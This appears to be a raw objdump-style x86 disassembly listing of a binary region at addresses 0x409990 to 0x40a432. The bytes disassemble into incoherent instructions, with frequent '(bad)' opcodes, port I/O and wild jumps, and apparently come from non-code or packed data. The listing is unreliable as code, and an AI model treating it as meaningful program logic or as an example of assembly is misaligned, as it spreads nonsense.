  409990:	xor    eax,0xff179fae
  409995:	dec    BYTE PTR [edx]
  409997:	pop    ss
  409998:	out    0x1e,eax
  40999a:	add    DWORD PTR [ecx+0x2d6f68ff],0xceff0040
  4099a4:	push   edx
  4099a5:	inc    ecx
  4099a6:	xlat   BYTE PTR ds:[ebx]
  4099a7:	xor    DWORD PTR ds:0xff17efae,0xe716cafe
  4099b1:	push   es
	...
  4099da:	add    BYTE PTR [eax],al
  4099dc:	push   ecx
  4099dd:	cmp    edi,0x402d5b68
  4099e3:	add    BYTE PTR [edi-0x58beac6c],ch
  4099e9:	add    DWORD PTR ss:[eax],eax
  4099ec:	xchg   edi,eax
  4099ed:	fdivp  st(6),st
  4099ef:	jne    0x409990
  4099f1:	mov    dh,0xef
  4099f3:	std    
  4099f4:	pusha  
  4099f5:	sub    BYTE PTR [eax-0x2a],0x34
  4099f9:	push   ds
  4099fa:	jmp    DWORD PTR [edi-0xf]
  4099fd:	sub    eax,DWORD PTR [eax+0x0]
  409a00:	call   FWORD PTR [eax+eax*1+0x0]
  409a04:	out    0x7f,eax
  409a06:	jne    0x409a10
  409a08:	outs   dx,DWORD PTR ds:[esi]
  409a09:	lahf   
  409a0a:	std    
  409a0b:	call   DWORD PTR [eax+0x1653da2f]
  409a11:	push   edi
  409a12:	push   0xff1e748a
  409a17:	addr16 and eax,0x3e80005e
  409a1d:	jmp    0xc356a218
  409a22:	outs   dx,BYTE PTR ds:[esi]
  409a23:	call   FWORD PTR [ecx]
  409a25:	ins    BYTE PTR es:[edi],dx
  409a26:	pop    esp
  409a27:	push   ebx
  409a28:	jg     0x409a2e
  409a2a:	fisttp DWORD PTR [ecx+0x6804436d]
  409a30:	cmp    al,0x4
  409a32:	add    eax,DWORD PTR [eax-0x1804d107]
  409a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a39:	scas   al,BYTE PTR es:[edi]
  409a3a:	ins    DWORD PTR es:[edi],dx
  409a3b:	call   DWORD PTR [esi+0x40]
  409a3e:	rol    DWORD PTR [eax+0x0],1
	...
  409a69:	add    BYTE PTR [esi],bh
  409a6b:	sbb    al,0xb3
  409a6d:	push   ebx
  409a6e:	jg     0x409a74
  409a70:	fild   DWORD PTR [ecx]
  409a72:	ds add al,0x83
  409a75:	call   DWORD PTR [ebx-0x4]
  409a78:	pop    edx
  409a79:	xchg   ebx,eax
  409a7a:	ret    
  409a7b:	inc    eax
  409a7c:	ins    DWORD PTR es:[edi],dx
  409a7d:	push   0xffc1d490
  409a82:	sbb    DWORD PTR [ecx+edx*8+0xdc3e40],esi
  409a89:	add    BYTE PTR [esi],bh
  409a8b:	test   BYTE PTR [ebp+0x75],ch
  409a8e:	inc    esi
  409a8f:	ins    BYTE PTR es:[edi],dx
  409a90:	lock cld 
  409a92:	xchg   ecx,eax
  409a93:	adc    bl,bl
  409a95:	(bad)  
  409a97:	ret    0x6802
  409a9a:	into   
  409a9b:	hlt    
  409a9c:	sar    edi,0xe1
  409a9f:	add    eax,0x30be0003
  409aa4:	test   BYTE PTR [edi],0x56
  409aa7:	sahf   
  409aa8:	outs   dx,DWORD PTR ds:[esi]
  409aa9:	jmp    DWORD PTR [ecx-0x65]
  409aac:	pop    esp
  409aad:	push   ebx
  409aae:	inc    DWORD PTR [ebx]
  409ab0:	fld    TBYTE PTR [edi+0x680442ed]
  409ab6:	cmp    al,0x4
  409ab8:	add    eax,DWORD PTR [eax-0x1803b9bf]
  409abe:	mov    BYTE PTR [ebx-0x5c],bl
  409ac1:	ins    BYTE PTR es:[edi],dx
  409ac2:	xor    DWORD PTR [esi+0x63b36d03],eax
  409ac8:	cmp    edx,0xd98e1123
	...
  409af6:	add    BYTE PTR [eax],al
  409af8:	pop    esp
  409af9:	adc    ah,bh
  409afb:	sti    
  409afc:	sbb    DWORD PTR [ecx],edx
  409afe:	jl     0x409b6c
  409b00:	or     DWORD PTR [esi+0x638b6cd5],eax
  409b06:	xor    DWORD PTR [esi-0x5],0x6b6c6610
  409b0d:	divps  xmm6,xmm6
  409b10:	inc    ecx
  409b11:	add    edx,DWORD PTR [ebx]
  409b13:	inc    esp
  409b14:	loope  0x409b26
  409b16:	and    BYTE PTR [ecx+0x42],al
  409b19:	pop    ebx
  409b1a:	pushf  
  409b1b:	js     0x409aff
  409b1d:	fdivr  QWORD PTR [ebx-0x35733601]
  409b23:	fild   DWORD PTR [esi]
  409b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b26:	test   al,0x3
  409b28:	mov    ecx,0xff5bf586
  409b2d:	sbb    BYTE PTR [esi],bl
  409b2f:	ins    BYTE PTR es:[edi],dx
  409b30:	push   cs
  409b31:	sub    ecx,0x3
  409b34:	xchg   ecx,eax
  409b35:	sar    DWORD PTR [eax+0x1163136c],1
  409b3b:	mov    ds:0x5afe10a6,eax
  409b40:	mov    eax,0x166bf61d
  409b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b46:	xchg   ebp,eax
  409b47:	ret    0x1179
  409b4a:	pop    esp
  409b4b:	clc    
  409b4c:	pop    ecx
  409b4d:	cmp    esp,DWORD PTR [edi+0x41ab696b]
  409b53:	add    eax,0xd48f003e
  409b58:	pop    eax
  409b59:	xchg   cl,dh
  409b5b:	pop    ebx
	...
  409b84:	add    BYTE PTR [eax],al
  409b86:	rol    DWORD PTR [edx],1
  409b88:	mov    esi,0x7e566b
  409b8d:	stos   DWORD PTR es:[edi],eax
  409b8e:	aad    0xf
  409b90:	push   0x9b0e0c
  409b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b96:	das    
  409b97:	fs call 0xff511b3b
  409b9d:	cmp    DWORD PTR [edx],eax
  409b9f:	pop    edx
  409ba0:	add    BYTE PTR [esi-0x1c],bh
  409ba3:	stos   BYTE PTR es:[edi],al
  409ba4:	(bad)  
  409ba5:	cld    
  409ba6:	adc    eax,0x95915df8
  409bab:	adc    al,ch
  409bad:	and    eax,0xa0ff1078
  409bb2:	and    BYTE PTR [ebx+0x0],0xbc
  409bb6:	jo     0x409bb7
  409bb8:	(bad)  
  409bb9:	aam    0xf1
  409bbb:	not    DWORD PTR [edi+ebp*1+0x290b1055]
  409bc2:	into   
  409bc3:	jno    0x409c2d
  409bc5:	pop    ss
  409bc6:	out    dx,al
  409bc7:	call   0x36c6:0x3a659900
  409bce:	push   ebp
  409bcf:	stos   DWORD PTR es:[edi],eax
  409bd0:	push   eax
  409bd1:	cs scas eax,DWORD PTR es:[edi]
  409bd3:	push   edi
  409bd4:	call   0xff50c06e
  409bd9:	adc    DWORD PTR ds:0x6316ff1d,esi
  409bdf:	sbb    eax,0xe46ee908
  409be4:	jmp    0x409c50
  409be6:	(bad)  
  409be7:	cli    
  409be8:	imul   ebp,ecx,0x0
	...
  409c12:	add    BYTE PTR [eax],al
  409c14:	adc    al,0x86
  409c16:	adc    dh,dh
  409c18:	mov    fs,WORD PTR [ebx-0x1]
  409c1b:	mov    ah,0xd7
  409c1d:	mov    ds:0x7515e941,al
  409c22:	(bad)
  409c25:	loope  0x409c6b
  409c27:	fld    QWORD PTR [ebx+0x2e54fe0f]
  409c2d:	adc    BYTE PTR [ebp+0x0],dh
  409c30:	dec    ebx
  409c31:	test   BYTE PTR ds:0xff160fae,dh
  409c37:	out    0x53,eax
  409c39:	call   0x6afb:0x1b9effff
  409c40:	daa    
  409c41:	xor    BYTE PTR [ebp+0x18],0xc8
  409c45:	or     ecx,DWORD PTR [ebx]
  409c47:	inc    DWORD PTR [edx]
  409c49:	cmc    
  409c4a:	inc    edi
  409c4b:	inc    ecx
  409c4c:	daa    
  409c4d:	mov    bl,0xee
  409c4f:	les    edi,FWORD PTR [eax-0x40ba767f]
  409c55:	xchg   ebx,eax
  409c56:	inc    ebp
  409c57:	call   0x1cb61e83
  409c5c:	push   0x52ff0b0b
  409c61:	icebp  
  409c62:	inc    edi
  409c63:	inc    ecx
  409c64:	xlat   BYTE PTR ds:[ebx]
  409c65:	mov    dl,0xd6
  409c67:	les    ecx,FWORD PTR [eax+0x77458981]
  409c6d:	xor    bh,bh
  409c6f:	(bad)  
  409c70:	xchg   edx,eax
  409c71:	cmp    bh,bh
  409c73:	jne    0x409c50
  409c75:	xor    DWORD PTR ds:0xae,0x0
	...
  409c9f:	add    BYTE PTR [eax],al
  409ca1:	add    BYTE PTR [edi+0x67e7ff17],bl
  409ca7:	dec    esi
  409ca8:	(bad)  
  409ca9:	jmp    FWORD PTR [esi]
  409cab:	sbb    ebp,ebx
  409cad:	(bad)  
  409cae:	loop   0x409d2a
  409cb0:	push   eax
  409cb1:	inc    edx
  409cb3:	outs   dx,BYTE PTR ds:[esi]
  409cb4:	push   DWORD PTR [ebp+0x7b]
  409cb7:	xor    DWORD PTR ds:0xff17cfae,0xff4defe7
  409cc1:	call   FWORD PTR [esi]
  409cc3:	sbb    esp,ebx
  409cc5:	sub    edx,0x75
  409cc8:	add    BYTE PTR [edi],cl
  409cca:	jecxz  0x409cb6
  409ccc:	(bad)  
  409ccd:	call   DWORD PTR [edi-0x29]
  409cd0:	jl     0x409cca
  409cd2:	ds add al,0xf8
  409cd5:	add    esp,0x4
  409cd8:	add    eax,DWORD PTR [eax]
  409cda:	mov    ebp,0x39007097
  409cdf:	js     0x409c65
  409ce1:	add    BYTE PTR [esi],bh
  409ce3:	add    al,0x68
  409ce5:	jne    0x409d4d
  409ce7:	mov    ebp,0xf2607ee
  409cec:	test   eax,0xeeed29ff
  409cf1:	sti    
  409cf2:	and    DWORD PTR [edi-0x4],ebp
  409cf5:	out    0xaa,eax
  409cf7:	sahf   
  409cf8:	imul   edi,edi,0xff6b0f11
  409cfe:	xchg   ebx,eax
  409cff:	or     al,0x5b
  409d01:	popa   
  409d02:	rol    BYTE PTR [ecx+ebp*2+0xff],0x0
	...
  409d2e:	add    BYTE PTR [eax],al
  409d30:	jae    0x409cba
  409d32:	imul   esi,DWORD PTR [ebp+0x46],0xe9bdd2ac
  409d39:	lods   al,BYTE PTR ds:[esi]
  409d3a:	cmp    DWORD PTR [ebp+0x16],0x11
  409d3e:	add    ebp,edi
  409d40:	cwde   
  409d41:	es idiv dh
  409d44:	dec    ebx
  409d45:	push   esp
  409d46:	imul   esi,DWORD PTR [ebp+0x36],0xc1bdc6ac
  409d4d:	inc    esp
  409d4e:	pop    ebp
  409d4f:	push   cs
  409d50:	mov    ecx,0x2bff5ac6
  409d55:	je     0x409dc0
  409d57:	jne    0x409d8f
  409d59:	ins    BYTE PTR es:[edi],dx
  409d5a:	add    bh,BYTE PTR [esi+0x756964a1]
  409d60:	stos   BYTE PTR es:[edi],al
  409d61:	pop    esp
  409d62:	out    dx,eax
  409d63:	pop    es
  409d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d65:	sbb    al,0xa9
  409d67:	dec    DWORD PTR [ecx+0x3ee3e780]
  409d6d:	nop
  409d6e:	push   cs
  409d6f:	cmp    ebx,0x63
  409d72:	add    BYTE PTR [ebp+0x41],dh
  409d75:	pop    ebx
  409d76:	jb     0x409d36
  409d78:	pop    ebp
  409d79:	or     eax,0x62eb6919
  409d7e:	rcl    DWORD PTR [edi+0x5cce0d9b],0x44
  409d85:	sub    ecx,0xd162d368
  409d8b:	mov    ds:0x68b60d83,eax
  409d90:	mov    bl,0x7
  409d92:	shl    DWORD PTR [eax+0x0],0x0
	...
  409dbe:	dec    BYTE PTR [esi+eiz*4]
  409dc1:	push   0x48910fb3
  409dc6:	dec    BYTE PTR [esi+edx*4]
  409dc9:	push   0x50811393
  409dce:	dec    BYTE PTR [esi+eax*4]
  409dd1:	push   0x38910b93
  409dd6:	dec    BYTE PTR [esi+esi*2]
  409dd9:	push   0x4080ff73
  409dde:	dec    BYTE PTR [esi+eiz*2]
  409de1:	push   0xa850f773
  409de6:	dec    BYTE PTR [esi+edx*2]
  409de9:	cmp    bh,ah
  409deb:	aaa    
  409dec:	jmp    0x684062bf
  409df1:	aas    
  409df2:	into   
  409df3:	add    al,0x3e
  409df5:	push   0x58e96856
  409dfa:	clc    
  409dfb:	and    DWORD PTR ds:0x915afecf,0xffffffaa
  409e02:	adc    bl,BYTE PTR [edx-0x58122417]
  409e08:	test   al,0x3
  409e0a:	shl    DWORD PTR es:[edx+eax*8-0x30b38b6f],0xfe
  409e13:	pop    edx
  409e14:	xchg   ecx,eax
  409e15:	cwde   
  409e16:	jmp    0xc85:0xe6e90099
  409e1d:	out    dx,al
  409e1e:	arpl   WORD PTR [eax+ebp*8+0x50],dx
	...
  409e4a:	add    BYTE PTR [eax],al
  409e4c:	loopne 0x409e59
  409e4e:	call   DWORD PTR [ecx+0x4d]
  409e51:	pop    ebx
  409e52:	out    dx,eax
  409e53:	xchg   edi,eax
  409e54:	jp     0x409ead
  409e56:	push   ebp
  409e57:	sub    BYTE PTR [edx],bh
  409e59:	add    DWORD PTR [eax],0x1c
  409e5c:	or     DWORD PTR [edi+eiz*2],0xffffffb5
  409e60:	outs   dx,BYTE PTR ds:[esi]
  409e61:	fwait
  409e62:	add    BYTE PTR [ecx-0x7a],al
  409e65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e66:	inc    ecx
  409e67:	jmp    0x2894ba81
  409e6c:	inc    edx
  409e6d:	sub    eax,0x35
  409e70:	sti    
  409e71:	or     edi,esi
  409e73:	sbb    al,0x16
  409e75:	or     eax,0x5075e175
  409e7a:	inc    BYTE PTR [esi-0x16eb7c5f]
  409e80:	push   0xf0c67cd
  409e85:	fwait
  409e86:	add    BYTE PTR [ecx],al
  409e88:	push   cs
  409e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e8a:	inc    ecx
  409e8b:	jmp    0xa8963795
  409e90:	cmp    eax,0x2bc2183
  409e95:	or     al,0x67
  409e97:	stc    
  409e98:	out    dx,al
  409e99:	call   0xe941:0xa60fd100
  409ea0:	pop    eax
  409ea1:	xchg   BYTE PTR [esi+esi*1],cl
  409ea4:	scas   eax,DWORD PTR es:[edi]
  409ea5:	push   ebx
  409ea6:	call   0xff4cba87
  409eab:	je     0x409f2c
  409ead:	(bad)  
  409eaf:	push   ds
	...
  409ed8:	add    BYTE PTR [eax],al
  409eda:	scas   eax,DWORD PTR es:[edi]
  409edb:	pop    edi
  409edc:	(bad)  
  409edd:	fdiv   QWORD PTR [ebx-0xa16be5e]
  409ee3:	mov    ds:0x579700ac,al
  409ee8:	or     eax,eax
  409eea:	or     al,BYTE PTR [edx]
  409eec:	mov    BYTE PTR [ebp+0x6f],0x57
  409ef0:	add    BYTE PTR [eax],al
  409ef2:	addr16 dec esp
  409ef4:	inc    ebp
  409ef5:	hlt    
  409ef6:	pusha  
  409ef7:	or     al,0xff
  409ef9:	dec    DWORD PTR ds:0xfd006a57
  409eff:	push   esi
  409f00:	push   0x0
  409f02:	repnz sbb dh,bl
  409f05:	push   eax
  409f06:	rcr    dl,cl
  409f08:	repz test DWORD PTR [eax+0x7aff5074],0xe375ff77
  409f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f14:	push   ds
  409f15:	lods   al,BYTE PTR ds:[esi]
  409f16:	pop    ss
  409f17:	pop    edi
  409f18:	or     eax,eax
  409f1a:	dec    ebx
  409f1b:	pop    ebp
  409f1c:	jmp    0x409f5e
  409f1e:	aas    
  409f1f:	test   DWORD PTR [eax+0x41],ecx
  409f22:	daa    
  409f23:	xor    BYTE PTR [ebp+0xc],0xaf
  409f27:	or     al,0xc2
  409f29:	inc    DWORD PTR [eax+0x6a8dd085]
  409f2f:	jp     0x409f28
  409f31:	jmp    DWORD PTR [eax+0x2e]
  409f34:	push   ecx
  409f35:	call   0x403d02
  409f3a:	outs   dx,BYTE PTR ds:[esi]
  409f3b:	fucomi st,st(7)
  409f3d:	test   DWORD PTR [eax],0x0
	...
  409f67:	add    BYTE PTR [eax-0x7f],dh
  409f6a:	push   DWORD PTR [ebp-0x8689]
  409f70:	or     BYTE PTR [ebx],0x7
  409f73:	call   0x401f82
  409f78:	jo     0x409f45
  409f7a:	out    dx,eax
  409f7b:	mul    DWORD PTR [eax-0x7f]
  409f7e:	call   0xffc1c028
  409f83:	(bad)  
  409f84:	fidiv  DWORD PTR [esi-0x15]
  409f87:	xchg   ebp,eax
  409f88:	ds jno 0x409f7b
  409f8b:	sti    
  409f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f8d:	inc    eax
  409f8e:	call   0x3e08:0x414b3e00
  409f95:	out    dx,eax
  409f96:	jns    0x409f84
  409f98:	mov    ebp,0x3e6a6738
  409f9d:	fdivp  st(4),st
  409f9f:	(bad)  
  409fa0:	repz or ebx,DWORD PTR [ebx-0x46]
  409fa4:	mov    ds:0x3896529,al
  409fa9:	xor    ah,bl
  409fab:	imul   ebp,edx,0x32
  409fae:	add    al,0xff
  409fb0:	ror    DWORD PTR [ebx],cl
  409fb2:	pop    ebx
  409fb3:	mov    bh,0x40
  409fb5:	leave  
  409fb6:	fs push 0x3e
  409fb9:	pushf  
  409fba:	mov    edx,DWORD PTR [edi+edi*2-0xc]
  409fbe:	fisubr DWORD PTR [ebx-0x6e]
  409fc1:	xor    eax,DWORD PTR [edi+edi*8]
  409fc4:	imul   ebx,DWORD PTR [edx-0x23c1bf44],0xfffffff0
  409fcb:	rol    DWORD PTR [eax],0x0
	...
  409ff6:	adc    ecx,ebx
  409ff8:	clc    
  409ff9:	mov    edi,0x4fd31192
  409ffe:	add    DWORD PTR [edi],ecx
  40a000:	sti    
  40a001:	out    0xd3,eax
  40a003:	(bad)  
  40a004:	gs jmp esi
  40a007:	cmp    esp,DWORD PTR [ebp+0x32de9ff]
  40a00d:	push   0xffc1cbb2
  40a012:	popa   
  40a013:	xor    edi,ecx
  40a015:	inc    eax
  40a016:	ds cdq 
  40a018:	das    
  40a019:	scas   al,BYTE PTR es:[edi]
  40a01a:	jbe    0x409fcf
  40a01c:	add    ch,al
  40a01e:	ja     0x40a056
  40a020:	inc    DWORD PTR gs:[ebp+0x34]
  40a024:	lock push cs
  40a026:	push   cs
  40a027:	in     al,0x63
  40a029:	jne    0x40a061
  40a02b:	pop    ebx
  40a02c:	adc    ecx,ebx
  40a02e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a02f:	or     DWORD PTR [esi],ebx
  40a031:	pop    esp
  40a032:	cmp    dl,cl
  40a034:	adc    eax,0x815b2465
  40a039:	mov    dh,dl
  40a03b:	fwait
  40a03c:	jmp    0xa8efb61c
  40a041:	add    esp,esi
  40a043:	pop    esp
  40a044:	jmp    0xc9335e4c
  40a049:	inc    ecx
  40a04a:	imul   ecx,DWORD PTR [ecx],0x59ea43f2
  40a050:	cmp    esp,edx
  40a052:	pop    eax
  40a053:	(bad)  
  40a054:	loope  0x40a0b1
  40a056:	cld    
  40a057:	push   es
  40a058:	into   
  40a059:	add    BYTE PTR fs:[eax],al
	...
  40a084:	push   esi
  40a085:	ja     0xe9b4e1ef
  40a08b:	fcmovnb st,st(5)
  40a08d:	xchg   ebx,eax
  40a08e:	sub    BYTE PTR [esi+eiz*4],al
  40a091:	mov    BYTE PTR ds:0xeb8129c3,dl
  40a097:	add    edi,DWORD PTR [esi]
  40a099:	fist   DWORD PTR [eax-0x69f70094]
  40a09f:	clc    
  40a0a0:	ror    DWORD PTR [edi+0x879d3de],1
  40a0a6:	cld    
  40a0a7:	sti    
  40a0a8:	sbb    DWORD PTR [ebx+0x7d],esp
  40a0ab:	fs stc 
  40a0ad:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0b0:	icebp  
  40a0b1:	or     BYTE PTR [ebx],al
  40a0b3:	or     ch,cl
  40a0b5:	mov    ?,ecx
  40a0b7:	pop    ebx
  40a0b8:	fs pop es
  40a0ba:	pop    esi
  40a0bb:	fs fs cmp al,0x56
  40a0bf:	out    dx,al
  40a0c0:	cmp    ebx,esi
  40a0c2:	fsub   DWORD PTR [edi-0x37]
  40a0c5:	or     bl,dl
  40a0c7:	pop    es
  40a0c8:	ror    DWORD PTR [esi+0x7205bf1],0x0
  40a0cf:	sbb    cl,BYTE PTR ss:[eax]
  40a0d2:	jne    0x40a101
  40a0d4:	and    cl,BYTE PTR [esi-0x38a3eef8]
  40a0da:	(bad)  
  40a0db:	push   ds
  40a0dc:	push   esp
  40a0dd:	sbb    eax,0xd580e904
  40a0e2:	jmp    0x40a14e
  40a0e4:	dec    ecx
  40a0e5:	pop    es
  40a0e6:	push   esi
  40a0e7:	sahf   
	...
  40a110:	add    BYTE PTR [eax],al
  40a112:	or     BYTE PTR [bx+di-0x1a],ch
  40a116:	loop   0x40a0a5
  40a118:	or     BYTE PTR [ecx],al
  40a11a:	inc    bl
  40a11c:	(bad)  
  40a11d:	out    dx,al
  40a11e:	out    0x9d,eax
  40a120:	cld    
  40a121:	jb     0x40a16a
  40a123:	dec    ebp
  40a124:	dec    eax
  40a125:	sub    BYTE PTR [edx-0x2c],al
  40a128:	cmp    al,0x1f
  40a12a:	sbb    BYTE PTR [ebx+0x5b1d6900],0x74
  40a131:	cmp    dl,BYTE PTR [edx-0x72]
  40a134:	push   ebp
  40a135:	sub    BYTE PTR [edx-0x50],al
  40a138:	call   0x9b8206
  40a13d:	loop   0x40a1bc
  40a13f:	(bad)  
  40a140:	pop    ds
  40a141:	aas    
  40a142:	xchg   edx,eax
  40a143:	dec    edi
  40a144:	enter  0x9d9e,0xab
  40a148:	push   0xbdf83de9
  40a14d:	add    DWORD PTR [eax-0x3216be52],edx
  40a153:	or     BYTE PTR [ebp-0xf],dh
  40a156:	gs fwait
  40a158:	out    0x76,eax
  40a15a:	pop    ebp
  40a15b:	repz dec eax
  40a15d:	das    
  40a15e:	pop    ebp
  40a15f:	or     BYTE PTR [eax+0x6d],ch
  40a162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a163:	call   0xe9a9:0xcd65b600
  40a16a:	cmp    eax,0x3cd5c054
  40a16f:	mov    cl,0xe8
  40a171:	add    cl,dl
  40a173:	xchg   ebx,eax
  40a174:	(bad)  
  40a175:	inc    DWORD PTR [eax]
	...
  40a19f:	add    bh,dl
  40a1a1:	repz (bad) 
  40a1a3:	(bad)  
  40a1a4:	clc    
  40a1a5:	mov    esp,0x1ed29267
  40a1aa:	dec    DWORD PTR [edi+0x58]
  40a1ad:	and    al,BYTE PTR [edi]
  40a1af:	call   0x401649
  40a1b4:	aas    
  40a1b5:	or     BYTE PTR [ebp+0x17838ff],bh
  40a1bb:	inc    esi
  40a1bc:	pop    ss
  40a1bd:	cmp    eax,0x153d7500
  40a1c2:	sti    
  40a1c3:	xor    esp,DWORD PTR [edi]
  40a1c5:	out    0xfe,al
  40a1c7:	call   FWORD PTR [eax+0x7c]
  40a1ca:	repnz scas al,BYTE PTR es:[edi]
  40a1cc:	pop    ds
  40a1cd:	push   esp
  40a1ce:	jne    0x40a15d
  40a1d0:	js     0x40a1f4
  40a1d2:	sti    
  40a1d3:	push   edx
  40a1d5:	push   esi
  40a1d6:	call   0xffbd4e52
  40a1db:	pop    edi
  40a1dc:	sbb    DWORD PTR [esi-0x3bd8fb3e],edx
  40a1e2:	mov    esp,ebp
  40a1e4:	jg     0x40a245
  40a1e6:	add    bh,ch
  40a1e8:	cdq    
  40a1e9:	repnz mov dl,0x55
  40a1ec:	push   esi
  40a1ed:	pop    edi
  40a1ee:	push   DWORD PTR [ebp+0x2b]
  40a1f1:	jp     0x40a268
  40a1f3:	or     BYTE PTR [edi-0x47001955],bh
  40a1f9:	repnz (bad) 
  40a1fb:	jmp    FWORD PTR [eax+0x52b967bc]
  40a201:	and    bh,bh
  40a203:	inc    BYTE PTR [eax]
	...
  40a22d:	add    dl,dh
  40a22f:	push   esi
  40a230:	push   DWORD PTR [ebp-0x21]
  40a233:	jb     0x40a1ed
  40a235:	out    0x58,al
  40a237:	jns    0x40a202
  40a239:	ret    0x5acf
  40a23c:	push   ebp
  40a23d:	mov    edi,DWORD PTR [esi]
  40a23f:	mov    al,ds:0x9c3a7562
  40a244:	adc    al,dl
  40a246:	rcr    DWORD PTR [ebp-0x5cd3ff2],0xea
  40a24d:	popf   
  40a24e:	or     esi,DWORD PTR [ebx-0x5669affe]
  40a254:	inc    esp
  40a255:	jmp    DWORD PTR [ecx+0x13feb2c4]
  40a25b:	or     al,0x6b
  40a25d:	stos   DWORD PTR es:[edi],eax
  40a25e:	xchg   ecx,eax
  40a25f:	ins    DWORD PTR es:[edi],dx
  40a260:	(bad)  
  40a261:	call   0xffa33a0d
  40a266:	ja     0x40a29a
  40a268:	or     eax,DWORD PTR [eax]
  40a26a:	adc    ecx,DWORD PTR [ecx+0x107a836f]
  40a270:	in     al,dx
  40a271:	call   edi
  40a273:	sti    
  40a274:	popa   
  40a275:	jne    0x40a2ad
  40a277:	sub    al,0x9d
  40a279:	mov    edx,0x458b2559
  40a27e:	push   edx
  40a27f:	call   0xffc3:0x4eaf6804
  40a286:	(bad)  
  40a288:	mov    dh,0x40
  40a28a:	lds    edx,FWORD PTR ds:[esi]
  40a28d:	scas   al,BYTE PTR es:[edi]
  40a28e:	xchg   BYTE PTR [ebx],dh
  40a290:	add    al,0xe8
	...
  40a2ba:	add    BYTE PTR [eax],al
  40a2bc:	mov    edi,0x35ff60b3
  40a2c1:	mov    ah,0xd7
  40a2c3:	adc    ebp,DWORD PTR [esi+0x6c]
  40a2c6:	add    eax,DWORD PTR [eax]
  40a2c8:	and    DWORD PTR [esi-0x36c014c],ebp
  40a2ce:	push   0x63
  40a2d0:	sbb    eax,0x8fe860dd
  40a2d5:	inc    edi
  40a2d6:	popa   
  40a2d7:	jmp    DWORD PTR [esp+esi*8-0x16]
  40a2db:	nop
  40a2dc:	nop
  40a2dd:	xor    eax,DWORD PTR [eax+ebp*2]
  40a2e0:	fstp   QWORD PTR [edx-0x44]
  40a2e3:	ret    0x4d9
  40a2e6:	adc    al,0xb2
  40a2e8:	xchg   BYTE PTR [ecx+ebp*8+0x4e1b6c6b],bl
  40a2ef:	popa   
  40a2f0:	xor    eax,0x9f7bd1b
  40a2f5:	jae    0x40a2df
  40a2f7:	add    esp,DWORD PTR [ecx+0x336098c4]
  40a2fd:	push   ebx
  40a2fe:	inc    ecx
  40a2ff:	sbb    BYTE PTR [ebp+0x5c6c2605],bl
  40a305:	enter  0x611d,0x24
  40a309:	pop    ebx
  40a30a:	and    DWORD PTR [edx-0x14166410],0x3a8ad22
  40a314:	jns    0x40a365
  40a316:	dec    edi
  40a317:	int3   
  40a318:	(bad)  
  40a319:	pop    edx
  40a31a:	add    DWORD PTR ds:0xcee057e,esp
	...
  40a348:	add    BYTE PTR [eax],al
  40a34a:	jle    0x40a2da
  40a34c:	div    BYTE PTR [ebx+0xc540609]
  40a352:	push   ax
  40a354:	(bad)  
  40a355:	pusha  
  40a356:	dec    ecx
  40a357:	repnz rcr BYTE PTR [edi+0x4530541],1
  40a35e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a35f:	mov    edx,0x7d31c316
  40a364:	sub    al,0xba
  40a366:	jle    0x40a3c3
  40a368:	scas   al,BYTE PTR es:[edi]
  40a369:	push   ss
  40a36a:	rcl    BYTE PTR [ebx+0x3260428],1
  40a370:	pop    esi
  40a371:	pusha  
  40a372:	adc    DWORD PTR [ecx-0x57],edx
  40a375:	xlat   BYTE PTR ds:[ebx]
  40a376:	cmp    BYTE PTR [ebx+0x538b6139],ch
  40a37c:	xchg   ecx,eax
  40a37d:	arpl   ax,di
  40a37f:	add    al,0x7e
  40a381:	imul   eax,DWORD PTR [eax],0xffffffc8
  40a384:	push   DWORD PTR [ebp+0x5e]
  40a387:	jno    0x40a389
  40a389:	add    DWORD PTR [eax-0x1a16be53],edx
  40a38f:	ficom  DWORD PTR [ebp-0x58]
  40a392:	cmp    eax,0xf5873504
  40a397:	fwait
  40a398:	add    BYTE PTR [ecx+0x6e],al
  40a39b:	(bad)  
  40a39c:	inc    BYTE PTR [esi+0x4a]
  40a39f:	sbb    esi,DWORD PTR [esi+ebp*8-0x13]
  40a3a3:	xchg   esp,eax
  40a3a4:	(bad)  
  40a3a5:	mov    esp,0x2fb5f335
  40a3aa:	push   ds
  40a3ab:	add    al,0xe8
  40a3ad:	dec    ebp
	...
  40a3d6:	add    BYTE PTR [eax],al
  40a3d8:	mov    ecx,0x9193ff04
  40a3dd:	add    eax,0x2315e175
  40a3e2:	dec    BYTE PTR [esi]
  40a3e4:	push   ds
  40a3e5:	jno    0x40a401
  40a3e7:	push   es
  40a3e8:	nop
  40a3e9:	pop    esp
  40a3ea:	call   0xff44831e
  40a3ef:	and    DWORD PTR [edx],0x4
  40a3f2:	jne    0x40a3d5
  40a3f4:	aad    0x1e
  40a3f6:	(bad)  
  40a3f7:	out    0xf9,al
  40a3f9:	add    esi,DWORD PTR [ebp-0x23]
  40a3fc:	icebp  
  40a3fd:	lea    ecx,[eax]
  40a3ff:	shr    ebx,0xc1
  40a402:	dec    dh
  40a404:	repz sbb BYTE PTR [ecx+ebp*8],al
  40a408:	not    al
  40a40a:	jmp    0x40a3ca
  40a40c:	pop    ss
  40a40d:	push   eax
  40a40e:	call   0xff4526c0
  40a413:	loop   0x40a492
  40a415:	(bad)  
  40a416:	dec    esi
  40a417:	adc    DWORD PTR [ebp-0x3216be54],esi
  40a41d:	sti    
  40a41e:	dec    edi
  40a41f:	test   eax,0x39500469
  40a424:	retf   0x7b
  40a427:	add    bh,ah
  40a429:	je     0x40a3e9
  40a42b:	push   0x3fcd29
  40a430:	inc    edi
  40a431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a432:	jne    0x40a43c
